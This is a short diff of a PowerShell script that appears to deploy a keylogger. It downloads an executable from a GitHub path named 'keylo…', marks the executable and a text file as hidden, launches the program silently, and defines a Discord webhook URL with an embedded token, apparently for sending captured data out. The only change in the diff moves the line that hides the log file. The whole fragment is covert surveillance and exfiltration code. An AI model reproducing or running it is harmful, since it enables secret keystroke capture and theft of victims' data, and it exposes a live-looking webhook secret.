@@ -11,10 +11,9 @@ Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylo
 if (Test-Path $downloadPath) {
     # Set the "Hidden" attribute to "True" to hide the file
     Set-ItemProperty -Path $downloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-    Set-ItemProperty -Path $textFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     # Execute the downloaded executable
     Start-Process -FilePath $downloadPath -NoNewWindow
-
+    Set-ItemProperty -Path $textFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     # Define the Discord webhook URL
     $webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"
 
